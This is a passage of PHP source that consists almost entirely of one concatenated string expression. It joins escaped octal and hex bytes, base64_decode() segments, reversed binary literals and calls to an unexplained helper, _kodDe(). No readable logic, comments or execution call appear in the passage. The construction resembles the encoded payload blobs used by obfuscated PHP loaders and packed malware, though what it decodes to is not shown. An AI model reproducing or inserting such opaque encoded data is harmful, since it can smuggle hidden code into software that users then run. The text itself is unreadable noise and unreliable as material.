?)lcY')."\223\40\73\75\115\261\35\5\115\167\305\164\350\232\70\256\35\313\61\61\324\162\45\101\103\233\65\141\212\21\251\17\115\52\361\266\261\126\246\365\234\316\306\45\253\263\3\243"."\16\222\241\3\217\217\232\340\57\20\365\207\240\342\244\66\354\70\312\211\321\73\13\57\307\344\262\0\344\320\11\25\43\63\56\302\335\226\76\150\300\46\55\240\31\351\324\254".base64_decode('YdYHNANireCAtI7ae6JRtTXWlUSENYUsj0eSYbZuQ21qqLWbH7xiRiEBRjDlpweF')."\x8c\xcc\x84\x99\x45\xcd\x9\x8a\x63\xe\x61\xec\xa2\x59\xb0\x75\x3f\xb0\x4b\x7e\x41\x80\x97\x45\xa5\xc5\x29\x0\x78\x46\x9c\x1c\x9e\xc3\x60\xcc\xaf\xe5\x27\xfc\x79\xb4\x5\xfc\xbc\xa1\xee\x33"."\130\111\312\107\171\4\346\106\40\167\74\214\210\67\142\207\177\167\54\1\31\232\61\24\21\140\3\272\5\225\165\367\100\124\136\132\27\113\302\111\166\220\153\100\117\205\226\47".base64_decode('GEYuoYSWMaGJvjSzhrAe5HOCkHN3xy+GPNkR6VqqdsbawlE10oVQUrIc3tPdFmJz')."\x28\xc3\x5b\x62\x8c\x19\x5\x68\xf\x42\x4a\xcb\x42\xd1\x88\x37\x79\x78\x45\x24\x91\x4c\x54\x8c\x42\xb0\x9e\xb0\x27\x6\xf1\x81\xdd\xf1\x70\x7b\x64\x5\xf\xb6\x47\xc2\xd1\xb6\x84\xda\x1a\x6a"."\355\20\151\272\102\235\20\120\7\61\47\146\7\335\351\125\204\135\23\234\237\123\107\60\157\312\6\113\165\261\120\52\143\16\124\261\170\320\51\252\303\22\203\356\142\216\230\364"."\x4\xf8\xe1\x94\x59\x62\xb8\x9f\x53\x90\x79\x86\x12\xf2\x1a\xec\x1e\x8d\x9d\x90\x35\xf4\xa7\x56\x9\x25\x14\xa7\xa8\xf2\xcd\x3f\x30\xce\x3f\x49\x37\x58\x18\xd1\x8a\x50\xbf\x2\x98\xbe\xac\x5"."\52\116\323\242\17\162\4\134\31\20\32\164\70\236\367\204\321\252\27\161\150\6\102\204\365\106\53\201\314\10\124\143\240\75\144\71\41\326\234\101\301\366\252\261\356\160\74\204"."\231\146\165\171\74\326\265\4\62\214\146\165\326\200\10\14\177\15\243\252\200\167\166\4\376\101\44\221\306\330\47\61\350\103\46\33\312\265\364\147\32\375\101\324\40\124\256\27"."\330\250\17\140\124\314\216\25\366\61\210\166\3\103\243\146\211\327\66\140\232\71\266\101\21\141\300\61\5\347\275\207\154\266\110\306\30\216\231\301\116\46\70\16\222\261\245\341".base64_decode('LpWtLBqSViMFIG42FocBccxhxozRyHg4wba3pa8uGWy4goEZsIp1dOJA9cGj+kZn')."\xd4\xf4\xfa\x67\x4\xfa\xd1\x47\xed\xf4\xc5\x34\x8\xa1\xbe\x80\x2b\x78\x18\xe4\x2f\x59\x3c\x37\xa6\x97\x6a\xec\xe6\xda\xc6\xbe\x60\x5f\xb0\xa6\xb9\xb1\x37\xe4\x9f\xd0\xfc\x13\x75\xfe\xf9\xfe"."\xfe\x19\x7d\x81\xda\x19\x0\xe8\x5f\x33\xd3\x37\xfb\x68\x9c\x0\x25\x6c\x3e\xb4\x1f\xfd\x34\xf5\x35\x4f\xed\xf3\x4f\xfb\xd9\xaa\xc5\xbd\x7d\xfd\xd5\x8d\x33\xe\xe9\xb\x1c\xda\x37\xda\x3f\xbd"."\266\231\325\223\52\131\210\321\114\215\363\246\246\147\324\240\46\41\72\212\47\51\20\134\47\45\140\21\23\106\121\100\327\314\71\232\301\321\34\352\31\221\243\327\337\67\243\277"."\x59\xca\x27\x81\xbc\x75\x21\x3a\x9\x21\xde\x2c\x4f\x17\xf2\x1f\x89\x7b\xc6\xb3\xe2\x7d\xf\xeb\xa3\x54\x48\x9\xec\x89\xf7\xc5\x80\x96\x2\x3c\x60\x64\xa\x7c\xb\xa1\x23\x9c\x33\xe8\x6e\xf2"."\175\315\124\372\173\64\233\310\214\76\306\120\103\141\320\260\140\165\226\12\306\152\46\205\50\350\253\341\303\164\330\372\36\320\235\121\235\55\17\4\167\205\321\342\140\74\43\212"."\222\102\71\102\21\102\15\230\223\342\153\224\57\46\243\250\142\322\152\224\207\322\172\1\346\151\12\244\266\123\132\121\117\110\75\124\325\144\250\45\32\126\31\206\1\114\314\302"."\4\53\266\160\211\35\352\232\300\250\14\77\244\4\355\116\330\24\330\371\366\352\234\102\20\203\242\133\226\151\65\22\21\253\135\52\142\112\14\261\144\16\32\133\5\61\363\112".base64_decode('0yKFDjnkU+UJKGqMQMBsti42PcZQ0KaimCEb0U+MrAnW9PWVevV0fy9a+Jp/sH/N').strrev('CbHŠ¹ËGLvz‹¢£iÅ¦ƒM\\PËƒ·'."\0".'sEPØåM‚¨@±ÿCìyk£¬')."\x4d\xec\xe0\x6\x69\x2\x9d\xed\xa8\xc0\x58\xf8\x28\x97\xe4\x8f\x4\x9d\x76\x71\xee\x9d\xb\x45\x24\x1\x18\xce\x91\xd0\x9d\x0\x4f\xe1\x93\x22\x55\x14\x86\xfe\x35\x55\x31\x34\x5f\x40\x1b\xa9"."\x55\x3a\xe4\xa8\x34\x27\x31\x6e\x3b\x7a\xde\x25\xae\xb4\x75\x2c\x84\x6e\x2f\xe5\x72\xe\xa7\xde\x73\xc6\x30\x94\xd\xbb\x4\xa4\xa7\x7e\x38\x7\x66\x54\xca\xda\x6e\x5a\x8c\x9\x9e\xe\xcd\xa8"."\232\136\51\141\244\120\100\54\253\274\310\304\361\272\44\204\10\231\244\122\303\44\175\112\244\113\151\211\305\242\341\120\227\202\117\162\70\201\20\231\220\10\167\207\320\361\205\331"."\xe9\x44\x32\xc\xc2\xc7\x48\x9b\x9f\x95\xbb\xc2\x1f\x1\xa6\x8a\x7f\x18\x30\xe0\x66\x11\xe3\xe\x15\x8d\x89\x8a\x98\x97\x61\x36\x8b\x8\x15\x3a\x2c\x29\x8\xc5\x20\x84\x69\x4b\x1f\x16\xa\xf9"."\60\215\341\103\175\360\141\216\310\47\310\165\237\220\261\371\106\14\175\224\174\160\372\332\7\144\267\317\321\54\104\52\140\272\30\76\43\155\76\303\156\43\234\2\251\200\104\261"."\x6\x39\x59\x2c\xfa\xc8\x69\xe3\x3e\xda\xb8\xa8\x3e\xa2\xe7\x7c\xac\x69\x3e\xd6\x62\x1f\x63\x7\x7d\x84\x87\x6b\x83\x66\xf5\xa0\x6d\x5\xcd\x22\x9f\x8\x7b\x66\x7d\x78\x21\xe1\x75\xec\x13\x52".base64_decode('P585WtAtkgSGSTAZPsGA+DKWWSp2szqlEG0WAESbOSBumo6PsZc+mfOEVoTYfqk4').base64_decode('nJV7Q8bf2wiYOxxVPkrfMlnl8+HmstfQEoGNP5qddq40YnrZNszpIoQnQHwtExsY')."\x77\xa8\x5d\x1b\x91\x57\x5e\xa5\x55\xc8\xce\x1c\xb6\x8c\x85\xc0\x4f\x88\x7a\x5\xd\xec\x65\x25\xbd\x42\x60\x5c\x69\x52\xcb\x24\xa4\xea\x1c\x2d\xc3\xea\xc2\x48\xc\xc5\x4e\x9a\x94\x7e\xc7\xf5"."\324\170\112\360\246\155\22\307\353\16\271\67\127\11\225\227\320\6\75\235\364\221\135\126\151\207\124\136\1\174\325\363\11\333\175\312\24\66\342\154\53\360\331\167\355\240\157\337"."\273\320\113\202\56\143\105\101\152\320\306\142\144\235\100\107\137\173\216\15\321\114\71\32\320\264\317\35\302\133\57\100\320\66\271\117\111\160\41\106\64\334\236\124\16\217\41\114".base64_decode('Z5gqzaPixAr5YxYUV9lsuJQmEi/CWiFNIavQebCqqYpVUuXKLhaNuxE+FlTKlyEe')."\156\171\20\360\342\40\335\27\147\30\3\305\304\221\131\2\372\120\263\201\123\303\222\161\370\322\31\114\114\255\274\112\45\144\44\0\254\135\256\172\161\120\354\60\266\44\24\134"."\201\117\242\150\60\302\361\213\275\42\5\335\103\356\131\221\236\203\26\17\121\267\121\30\67\12\262\20\113\100\305\131\55\110\5\274\325\75\142\267\266\311\276\351\21\43\204\144".base64_decode('PhCe+fA1r3SYCwkOaj25cs67xH3lLWdI1+/a0LDIs5olxo+hIYwLhDQQJxFBKdmg')."\66\42\50\27\127\36\11\231\330\316\70\153\260\374\351\56\224\6\333\174\344\267\3\165\134\336\241\174\106\60\352\140\211\50\16\102\333\77\212\206\7\375\220\216\44\115\37\26".base64_decode('H6Ifesqz+yuSiC31Ur4Nbmnw9zK05xnBhsa4huEMoDVUSVbAcY4bodGWhDh+R6cm')."\72\363\350\67\42\352\163\350\250\263\2\170\213\54\301\7\226\174\126\270\351\215\204\216\372\14\371\104\151\211\262\70\71\265\220\23\141\334\57\316\12\66\256\142\207\211\261\26".base64_decode('2ykjGoSHVi1vB17AlcPtlskpYH7sexO1EhaTX0l6jmppPFzkRRlIyuMlNDxQT1BM')."\204\353\234\241\40\46\75\326\322\171\243\20\260\350\151\26\100\214\3\134\43\373\352\44\132\114\240\231\65\66\71\27\340\364\73\332\63\317\216\151\42\156\324\12\130\250\146\321".base64_decode('IAnFAX4gt4z4GJQpCF6KjSIkZO0mlFjORFFjOBp4jRKvhlN1gKWM1LDYqdqIhtYf')."\x14\x4d\x3a\x23\xdd\x7\x93\x70\x94\x13\xc6\x18\x77\x84\xd3\x86\x83\x21\x78\x33\x9a\x4c\xd4\x2d\x12\x8a\x13\x53\xc0\x64\x94\x4d\x4e\x9e\xb2\xc9\x17\x5c\x86\x6f\xaa\x2b\xa5\x9b\x76\x0\xe0\x74"."\x72\xa4\x7\x4\xa9\x53\xf9\x66\x3d\x65\x16\x61\x45\x48\x8a\x25\x79\x73\x44\x97\x80\x1\xdb\x31\x8b\x22\x46\xa\xd2\x68\x29\x4a\x14\x2a\xa5\xe2\x93\x44\x5a\x84\xf6\x57\x9a\x10\xcc\x62\xc8\x48"."\132\310\113\270\156\272\205\3\230\333\10\310\170\72\144\131\154\1\323\156\342\173\33\4\224\101\30\27\46\330\356\253\164\134\321\302\303\43\102\155\204\26\205\53\16\320\355\37".strrev('*ànËã	ÚÙ¤Èd™ËÛt,Òxo‰Ë”<œª”^ÊÈÊ“Ë¿’»»éÒĞ')."\301\70\223\43\157\73\67\241\356\45\343\335\250\172\162\222\145\22\44\47\246\261\162\30\235\362\255\131\243\240\333\374\260\266\354\112\70\353\377\61\155\134\76\362\170\207\114\266"."\x5c\x70\x9c\x24\xab\xc6\x4a\x76\x23\xba\xcc\x41\x70\x81\xac\x40\x59\xfc\x8\x2f\x23\x4c\x80\x38\x90\x2\xaa\xe3\x22\xa9\xe2\xa4\x7c\x69\x3b\xb9\x56\x8\xda\xbe\x74\x3c\xf0\x91\x15\x89\xa1\xed".strrev('@Oõİûî;”¼ÑaŠÉˆâ­htäß ˜^xò…dåÏ'."\n".'8Låi?àpM\\LéÓzÍyY')."\277\327\335\364\360\353\233\116\247\337\23\205\121\73\303\144\263\160\367\204\376\376\317\332\135\350\267\120\260\134\267\242\327\374\333\103\337\377\131\366\213\346\215\57\34\260\177\303"."\x1d\x7f\x3f\xef\xd2\x97\x2f\xf\xdc\xf9\xe2\xc9\x37\x3e\x73\xf8\x9a\x33\xdf\x5c\x9a\x1a\xe8\xd8\x6b\xf4\x8a\x3\xad\x5b\x1f\xb8\x78\x64\xf9\x27\x27\x3f\x3d\x67\xf5\x41\xf1\x4b\x37\xed\xf1\xe7"."\xf0\xc9\xcf\x67\x7f\x79\x40\x36\xb5\x6b\xf6\x37\x17\x4d\xf9\xdc\xbc\x72\xe9\x57\xe1\xe3\x36\xee\x11\x79\xf4\xf0\x5d\x42\x1b\xed\x6d\x7f\xfa\xd3\xfc\xcc\xdd\xf6\x8f\xf4\xb\xff\xfb\xea\xa3\xa7"."\x5e\xf0\xdf\xe2\xb1\xd7\xed\xd5\x7d\x70\xd7\xce\x6f\x3f\x7b\xf5\x5e\xfe\xa8\x72\xe1\xd3\xd5\xe9\x9b\x77\xdf\x7d\x62\xca\x4e\xa7\xdb\xbf\x78\xeb\x93\x9d\xcf\x3a\xb5\x69\xff\x5f\xbf\xfb\xe7\x15"."\x9d\x1f\xdd\xf3\xf2\xb1\xf7\x1e\xf0\xd0\x7e\x8b\x7e\xf7\xe0\x41\xeb\x95\xd7\xda\xde\xb9\xd5\x77\xdd\xa6\x8d\x3b\xec\xf8\x87\xb6\x42\xf5\xdc\xbf\x7e\x70\xcb\x14\xa7\x6e\x5d\xfd\x89\x3b\xdf\x74"."\351\53\157\277\67\367\73\255\371\173\136\171\375\327\13\156\36\276\177\374\371\237\254\31\335\345\215\43\2\211\35\317\71\175\150\333\153\117\176\220\375\340\332\216\71\137\277\73"."\362\316\332\272\37\376\323\274\351\200\275\217\74\277\151\321\337\163\243\163\256\314\373\37\335\175\155\307\365\17\317\331\250\157\131\222\177\367\363\332\253\272\246\331\267\44\127\74".base64_decode('9v2PXz+y5SBt23mhVT986t/zX/ro4il/WXzb9ZefF7l28LPf57+40ThUD9zcdad1')."\x45\xb2\xe6\x81\x96\xd3\xec\x77\xfa\x77\x39\xe0\x37\xc5\x5b\x32\x17\xd7\x3f\xf4\xd2\xc0\x3f\xfe\x70\x5a\x7d\xed\x5b\x33\xae\x6a\xac\x5b\x7a\xff\x43\xeb\x62\x17\x3f\x7b\xe2\xc7\x5b\x7f\xda\xfc"."\xfa\xbb\x3b\xee\x3a\x6d\x7b\xe3\xc7\xdf\xed\xba\x63\x9f\x73\x6f\xaa\x9f\x3d\xad\x21\xb7\xfb\xbe\xf\x54\x2f\x3b\xeb\xba\x2f\xea\x36\x75\xff\xf0\x3f\x5f\xed\xb9\xdf\xd\x7\x2b\x87\xbc\xbe\x78"."\xee\xab\x87\x3e\x36\x6d\x51\xfe\xc4\x7\x6\x77\x38\x64\xef\x5f\xaf\xfa\xc9\x8c\x63\x3b\xe\x58\xb0\xba\x65\xcb\x59\xf\xe\x3e\xd6\x71\x5a\xc3\xf6\xfa\xae\xc2\x11\xbb\xae\x3e\xf7\xde\x7d\xed".base64_decode('7x3cuusL2Vs/PPage53c6Lzjnrl939ZT/vLw2Q99J7GT9vAxzxyYWvzqPh/cP71l')."\154\116\332\76\161\135\153\335\111\57\74\63\324\370\367\353\73\23\201\322\153\271\13\373\127\357\167\150\342\250\15\253\172\232\202\307\215\336\77\262\137\367\13\17\76\270\143\313"."\370\176\117\366\35\373\313\317\236\372\164\350\221\343\336\357\31\171\151\44\367\350\324\125\311\37\314\132\76\77\372\351\364\131\133\316\125\355\203\177\274\307\316\123\37\217\135\77".base64_decode('vNtOVS//KrPnuuvyd5w+O/OXvs6xwMbYrR0fndF40rPfP/vES39yypIfmC8Ozop2')."\335\277\317\136\373\154\173\354\366\367\166\76\360\262\17\177\174\124\146\355\77\66\76\374\323\365\301\147\357\330\375\254\105\173\235\260\343\256\117\51\277\71\152\353\236\312\167\203".base64_decode('77/T1nvIevPIA+tPmPfOlYH61Pbdmg9Z+ZOXHrlzl4fmfrTrQXWrXr8/UP/Shz/8')."\xdd\xf\x8f\xdf\x79\xd5\x7d\xd9\xeb\x5f\x7b\x68\x73\xfd\x75\xc3\x7f\x3d\xf4\xe2\x1f\x5e\xfa\xe7\x91\x25\x3b\xef\xfb\xf2\x1\xbb\x75\x1f\xae\x9f\xd6\x37\x56\xb5\xd4\xff\x91\x3e\xe5\xba\x43\xdf".base64_decode('3Oujtl9NHbztpB/84eCD26/YvOGpHWed/cl+WybO+c5r60cffmGdeXn1ig2X1Bw9').base64_decode('bfaJ8eEzPj0zvTT9yfp3Lup59vbnXlv2TN+Ji55YcNyDmZG5f3tj/wN3vvLc180d').base64_decode('f7523b4PrLvi8V1TU3eNJrbusKV96fNH3PzpC3NefWrZyrNnzf7jvB9/v+7mL/fx')."\265\134\362\171\141\70\166\325\315\57\235\337\172\315\163\257\335\371\300\103\307\75\377\201\163\334\131\217\355\267\323\373\157\237\373\333\251\210\267\356\171\342\141\153\312\273\353\16"."\xbb\x21\x76\x86\xaa\x67\x1f\x79\xbe\xef\xcc\x8e\x9d\x1b\xf6\x1d\x6a\x7a\x10\xa1\xbe\xd\xc5\x5f\xee\x38\x37\x7e\xdc\xe8\xbc\xc2\x6d\x1b\xf6\xf9\x6c\x5d\xf1\xd8\xf\xbb\xa7\xd5\x36\xbc\x90\xf8".base64_decode('y9Vv3LbLHW+smju8yryvcX3941XT3v786VNWNwxvfeyPWz8+d93lv7175h+qTtrp')."\215\333\327\35\164\101\350\372\55\267\16\216\374\372\300\37\36\160\373\360\345\7\166\334\267\127\337\261\27\175\174\117\353\141\233\173\227\137\376\362\7\27\134\251\232\313\306\354".base64_decode('PR94dM66BcEfJXaZ1nf5kTvOuX3HKfe96d/SeN0bF9Qv27Bv/u7LFocX9XbP2vWn')."\125\33\377\276\375\317\67\35\323\376\363\213\136\364\355\344\357\70\354\372\233\217\173\140\363\363\346\354\237\174\331\256\146\353\276\263\171\106\102\33\66\353\322\365\27\77\167\363".base64_decode('lWvWrB/53qydxqZfuu+cHV78n9Pn3XLn/1y9Zu7J/7Pza4vPvu6f//n0lCnvbHt6').strrev('şû,Z¯çÆo}¿Øìføİé}Şıû~ë:.d.hî÷ŠÙsŞHï{ì').strrev('ëù¡¸oÇ‹ñ¾­Ü‹½ÿ9îëËz]ìÎËÖÜö\\{ÚåÁıæ[Şêá¾šöGæ')."\276\376\334\53\301\243\232\233\276\376\307\263\346\5\367\334\72\366\345\347\57\237\374\27\365\202\273\377\373\227\355\273\6\237\130\364\345\113\237\75\266\374\255\237\377\367\271\251"."\363\127\233\247\376\347\241\17\276\116\126\217\376\154\303\307\347\35\360\112\366\217\17\356\177\106\333\157\62\375\35\77\372\105\365\372\175\366\331\376\341\334\373\17\210\77\77\343".base64_decode('r4+sO3PpvcddNPzypkNXRe+/+ob98/FTvxzd7jzfv75+S2zVlfcccMPqF+PTa/ff').base64_decode('o+vHF7fsPvWcv0394ovrb9305uWrSk/eePmpMz/wXbPwqNvuurrHqrrvgKXrHl46')."\xe3\xb1\x5\x2f\x3d\x1e\xba\x6b\xe0\x9c\x25\xdb\x5b\x2e\xf9\xec\x94\x6b\xd7\xeb\x3b\x58\x2f\xa4\x83\xcb\xef\x99\x77\x67\xed\x43\x8f\x5c\x1b\xbe\xf9\xe4\xfb\x57\x1d\xe5\xff\xcf\x69\xd7\xce\x3e"."\155\341\254\373\117\212\266\77\177\350\363\7\144\112\333\376\262\70\71\365\342\232\235\264\352\373\227\75\164\331\11\217\265\277\267\144\303\163\133\346\276\262\340\362\143\356\375\127".strrev('Ğ1‡³¿”»Õë~îÏğô_ìî»{O÷óûØîFv)¸?eşx;õîåÜö«ÆÅİ')._kodDe('MCJdalMq3d/fFZnX6qVNBHODKrznWFtPbIvcvIVhynPRyy1F2Us1JSFeRnxcrSuC4g==').base64_decode('Rf69Xzr/yGvPObTzxgsvOf7f//pRpvG82Bfnrb94W8O5pV1mPXvTxjvuuun2v96S')."\275\347\341\47\153\137\351\133\171\324\225\177\76\357\167\357\46\246\157\374\343\367\76\135\361\251\57\167\374\255\237\156\171\153\106\365\212\65\155\53\57\74\173\112\357\372\13\377"."\266\52\262\256\177\377\335\146\374\353\374\103\213\173\256\75\346\205\203\316\154\170\261\341\376\23\267\216\266\351\373\277\264\56\166\322\207\357\71\367\136\171\373\215\352\246\206\177"."\326\52\67\135\171\357\364\221\247\167\352\335\160\370\272\131\237\376\107\271\343\27\47\154\272\161\105\360\311\211\375\177\165\352\57\167\13\67\165\334\374\346\232\263\257\274\354\224"."\346\27\323\127\145\26\357\76\357\147\47\235\122\365\151\335\346\364\43\273\34\325\260\357\157\147\145\237\314\337\362\343\107\336\236\273\362\274\163\56\272\256\176\325\336\173\267\376"."\xa6\xfd\xe3\xef\xed\x7e\x61\xdd\xc0\x96\xb7\x46\xbf\x37\x58\x3c\xbd\x31\x70\xbd\x7e\xd1\x9d\x33\x7e\xba\xdf\x43\x4f\x5e\xf4\xf4\x69\x57\x6c\x68\xe8\xf5\x7\xef\x1f\x19\x7e\xf3\xca\xcc\xe7\xcf".strrev('’ç}'."\r".'Ç•¦ğ8ÓíÀ÷xoO•ãŞ,w{Šô½öS™Ã{¾s™Â]Áé¢}w›±ñ¿Zí')."\257\226\354\131\275\343\363\377\372\254\264\303\65\326\117\63\15\367\266\54\353\333\350\273\61\74\145\315\71\7\354\147\374\171\331\65\277\275\155\363\265\317\257\157\70\353\334\333"."\336\173\376\335\373\6\337\277\164\311\214\275\217\271\350\344\275\367\232\323\276\267\365\367\351\65\57\376\143\327\227\136\172\356\375\375\37\237\276\142\330\71\67\21\373\111\320\267"."\354\301\313\357\52\375\353\356\73\214\307\143\273\254\75\324\367\203\245\275\13\76\31\274\354\316\73\377\371\237\55\233\172\317\132\365\356\27\35\177\270\75\357\237\275\367\264\177".base64_decode('XpU+7PYHrtxT/+q9jp0/u+Wx5qtu2/8X//rt+48Zob3jhzx1+lVt/35xv2vC1256')."\346\370\125\47\174\375\253\217\37\74\375\246\213\236\330\357\353\337\155\277\346\252\357\133\327\136\37\17\377\161\331\203\3\147\236\236\276\371\344\317\137\113\16\235\136\172\375\277"."\237\65\77\171\301\321\343\237\176\361\144\340\356\377\174\262\375\170\365\374\257\76\30\375\375\301\107\257\375\352\151\264\263\276\374\342\274\37\134\270\161\321\27\125\127\77\373\203"."\xd8\x85\x17\x7e\xfd\xd6\x3f\x3e\xfc\xf7\x3f\xee\xd9\x78\xcf\xc4\xf8\x57\x8f\xee\xfa\xfb\x7b\xbe\x7c\x60\xfb\xc3\x7\x5f\xf0\xf3\x4f\x4e\x3d\xf9\xc9\xe6\x2f\xbf\xfe\x79\xf3\x1b\x67\xf6\xee\xff"._kodDe('K7LhL0q/7+rkUOnHarLWgcpmq7LobRLgXOLu7vAaywHaxXDOYdBKymdypuxywRIijQ==').strrev('"ûooÛq8¼ï3Ãø÷[£Ş{»”}÷÷ğ/Où—z}>‡úìÑ¹âüs_‡êı~+ï')."\245\135\161\353\214\323\222\237\145\166\272\270\372\103\137\363\156\157\234\70\270\145\325\323\77\375\276\332\262\337\313\33\266\154\31\376\315\272\77\31\117\255\37\276\156\312\3\37"."\335\142\236\177\301\262\215\373\63\153\220\302\130\146\240\224\6\32\34\364\301\255\341\114\141\150\24\270\373\271\365\240\33\124\77\147\16\375\30\310\346\265\22\123\374\236\50\224"."\x86\x87\x32\x70\x29\x3c\x7f\x1e\x28\x6e\xcd\x9e\xd\xf6\x18\xf3\xea\xe1\x3\xa\x99\xd0\x7\x86\x9d\xa1\x3c\x2b\x11\x22\xf3\x83\x56\xae\xa0\x43\x89\x20\x24\xce\x4c\x14\x87\x72\x25\x80\x15\x7"."\122\116\156\4\344\117\63\147\316\7\76\64\223\316\345\207\130\335\365\160\77\74\72\76\341\14\15\0\164\366\74\110\233\312\17\33\203\71\50\141\116\3\264\263\241\16\150\277"."\x89\xb1\xb4\x95\xcb\x43\x6d\xf5\xd\xcc\x9a\xc4\xd1\x26\x32\xa3\x4c\x3f\x3c\x37\xbc\x5a\x4f\x8f\xb2\x51\x81\xc1\x98\xc7\x2a\xc8\xf\xa7\xc7\x4d\x76\x2b\xdc\x50\xf\x15\x68\x86\x95\x4b\x8d\xd"."\262\301\200\332\122\351\302\100\176\210\15\160\35\244\35\233\130\235\63\330\255\152\76\123\114\17\231\300\51\317\237\131\307\152\203\51\232\77\27\172\73\207\101\212\343\126\156\210"."\x69\x1e\x4e\x58\x3\x39\x67\xc\xb8\xc7\xe2\xc8\xf8\xe8\x84\xcd\x2e\x5f\xa\xba\x95\x2d\x81\xbc\xcf\x31\xec\xd5\xa5\x21\x88\x19\xb6\xc6\x47\x8d\x2c\xd3\x4d\x19\xc9\x20\xe6\x1c\x6e\xf2\xe7\xcd".base64_decode('nst6DQPDZmDmTJjXIhrA0hD0c/4sSJa1J3RTg37OmQ1DZg4UDYex1rPYmJgZKz8y').base64_decode('DDWOGebgRArGugHqmDkH+pzXU+kMsxSZ1cCm3RgbHhiCFVwazmT1CWgONHbAGp1I')."\347\126\263\326\260\174\305\324\260\143\61\105\165\64\160\231\22\63\136\311\24\215\61\35\246\40\227\325\235\325\46\164\60\243\17\14\231\114\167\145\356\114\350\227\221\36\33\35"."\32\7\150\303\74\266\226\240\366\171\15\60\121\306\120\46\153\246\307\331\120\261\346\260\144\163\352\131\261\15\254\203\254\374\141\75\127\34\203\53\201\372\371\0\235\63\27\6"."\173\326\74\66\276\303\231\21\235\331\53\351\245\324\150\316\202\45\134\230\310\152\305\161\330\175\303\253\235\321\314\4\353\321\230\225\325\234\1\266\224\7\314\121\46\113\231\125".base64_decode('D5M/eyZUNIdBxtMjhVIWipvN8MSsOtaVurlsa8LyHTBMbSgPMzCXNXz+HMipF7XR').base64_decode('iXFmpzKkD2aY1lr9LLZzxlfblgZ3CA1sW4yPDheNQVju46WcvTptsbXDFg9Lm8pO').base64_decode('OMUxkOrPZ5MyfxZEz5kFrZ8FjbdT+cxQDqZr7jxox6w5kHEu/K7MwxJq0VLDTFqL').strrev('ô3±¯:Û`W±ì)Ô,'."\r".'¦]]3®°Á9kd§=`:]µÀ­yÏ[€5í‡T¸')."\263\234\202\255\306\62\14\111\41\3\7\23\162\51\251\202\43\105\243\220\53\66\341\230\26\127\1\241\312\145\1\334\302\200\273\317\14\277\126\270\43\4\201\252\155\217\232\154"."\xfb\xd\x9b\xe9\x54\xce\x2c\xa5\x5d\xa5\xa6\x7\x5c\x65\x72\x28\x93\x3\x78\x63\x6\x27\x81\xa3\x72\x5c\x8a\xb3\xc\xe6\x1a\xac\x1\x32\x7b\xaa\x1c\x8\xb0\xe1\x1e\x90\x66\x96\xca\xc2\x1d\xcd"."\36\16\310\140\277\34\153\24\120\53\162\271\200\333\4\120\45\377\301\30\120\63\63\133\137\135\322\13\342\176\331\36\226\6\36\333\356\365\164\253\311\120\142\251\244\201\207\155"."\xcb\xd8\x72\x52\x85\x66\xb4\xd4\x2d\x51\x82\x34\x8e\xf2\xc\xba\x87\x80\xad\x90\xb7\xaf\xbd\x63\xeb\xa9\x1b\xb6\x9d\x79\xdd\xb6\xf5\x9b\xb7\xde\x7e\xfa\xdb\x9b\xaf\xdb\x7a\xd7\x99\x28\xf8\xe6"."\255\247\154\335\174\301\366\163\326\275\171\353\372\67\157\375\305\333\307\337\370\301\235\277\336\172\352\265\157\37\163\327\326\215\233\266\136\172\374\233\167\334\365\366\75\307\277\265"."\351\344\67\157\275\146\333\306\23\267\256\273\371\315\73\66\154\75\341\242\255\307\237\272\355\364\365\157\336\265\21\245\337\166\202\50\31\45\333\172\315\331\70\357\235\277\332\172".base64_decode('661vX7yJx35w5y9pYyYAby3RHWySx9SqyOgoixRYkLodULpzOhphhZh/Yh0sJ6tb')."\212\103\164\261\64\364\257\140\26\374\164\301\121\163\107\133\61\12\70\132\141\163\23\340\213\62\251\347\213\170\151\301\50\5\251\61\224\113\33\133\132\177\225\206\231\106\124\130".base64_decode('VnisxVzV4E+4PcNiOWVQQ4B0ozKIsinMpkFxTPadH+eT7tkEFaeVN4NNbYZLx4XQ')."\x16\x1a\x26\xe9\xd6\xd3\x1b\x92\xb2\x25\x45\x76\x95\x1b\x25\xb8\xf6\x9b\x1b\x99\xc8\x51\xee\x91\x0\xa9\x2a\xb9\xdc\xf7\x29\xb4\x29\x3e\x85\x5c\xe9\x2a\x6e\xcb\x3f\x7c\x59\xcf\x2e\xc0\xe5\x3d"."\46\67\337\322\213\71\351\162\247\70\136\161\20\345\326\310\367\311\236\256\45\52\14\43\357\234\53\22\355\353\222\123\41\241\74\332\262\24\327\60\133\163\10\321\211\113\110\162".base64_decode('3S66QYNCeowq4njS0tMG0x3W8yQlU8QnMmuutJxCW8ByXT0tbC5mi9jG21nQDPaZ')."\160\225\247\112\365\302\267\60\5\221\241\71\357\165\26\337\60\155\55\222\15\63\116\326\350\367\373\45\261\254\320\31\303\137\120\234\270\346\105\260\60\336\315\223\301\333\270\362"."\x3\xda\xe6\x99\x8c\x6e\x3b\x8d\xc4\xaa\x4a\x99\xa1\xa0\x86\xce\xb\xd4\xa3\xf\xb2\x21\x1a\x2\x73\xd1\x27\x19\x25\xd8\xc4\x7d\x30\x72\x25\x9b\x99\x3a\x4c\xd\xcc\x6\x3a\xc7\x5e\x0\x9a\x1b"."\xb\x8\x2e\x69\x92\x9a\xf\x70\x91\xab\x54\xc8\x31\x28\xfa\x44\x49\xe2\xa5\x2\x9e\xe1\x46\x77\x9f\xf5\x42\x5a\xca\xb4\x40\x4b\x39\x52\xa9\xea\x20\xc\x6a\x40\x8c\x87\x36\x43\xc4\xeb\xe9\x43"."\140\142\244\121\32\205\4\54\157\247\173\336\121\377\375\174\51\240\351\105\344\102\332\46\272\246\160\342\100\221\266\144\160\32\27\253\10\147\47\303\365\15\131\35\171\312\213\210".base64_decode('JClwJVM7p7FrQhvRKUZB5+uvZPObDKyQraKznJ16aK2qaQMio5EWtS0SF1tdLZa8')."\316\0\144\157\4\241\356\210\232\110\304\44\327\0\304\276\155\205\272\64\326\246\266\306\142\113\43\260\14\141\340\33\45\114\211\355\241\304\5\61\16\11\273\50\174\247\42\253"."\207\311\244\10\66\304\306\307\155\102\1\45\113\264\336\133\73\102\161\256\324\336\20\250\13\324\213\264\250\102\25\353\366\67\61\163\317\104\62\24\257\140\216\117\315\364\141\122"."\300\64\37\62\164\304\226\53\255\261\150\117\147\127\202\132\241\123\170\127\114\212\47\252\313\20\315\214\365\313\243\241\370\160\167\64\324\32\126\42\135\311\30\263\115\340\72\244"."\304\52\45\301\303\154\10\54\133\347\306\370\220\237\6\144\313\31\271\104\136\22\54\343\136\137\165\137\125\337\364\276\232\276\332\125\201\76\273\77\50\235\135\206\74\75\20\350"."\156\203\356\65\362\257\264\15\